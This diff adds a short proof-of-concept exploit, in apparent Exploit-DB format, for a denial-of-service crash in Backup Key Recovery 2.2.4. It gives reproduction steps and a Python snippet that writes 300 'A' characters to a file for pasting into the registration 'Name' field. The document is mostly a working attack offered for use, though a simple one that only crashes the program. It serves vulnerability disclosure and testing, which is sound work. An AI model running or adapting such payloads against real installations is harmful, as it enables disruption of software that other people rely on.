@@ -1,0 +1,23 @@
+#Exploit Title: Backup Key Recovery 2.2.4 - 'Name' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-04-24
+#Vendor Homepage: www.nsauditor.com 
+#Software Link: http://www.nsauditor.com/downloads/backeyrecovery_setup.exe
+#Tested Version: 2.2.4
+#Tested on: Windows 7 x64 Service Pack 1
+ 
+#Steps to produce the crash:
+#1.- Run python code: Backup_key_rec_2.2.4.py
+#2.- Open backup.txt and copy content to clipboard
+#3.- Open Backup Key Recovery
+#4.- Select "Register"
+#5.- In "Name" paste Clipboard
+#6.- In Key type "test"
+#7.- Click "Ok"
+#8.- Crarshed
+ 
+cod = "\x41" * 300
+ 
+f = open('backup.txt', 'w')
+f.write(cod)
+f.close()
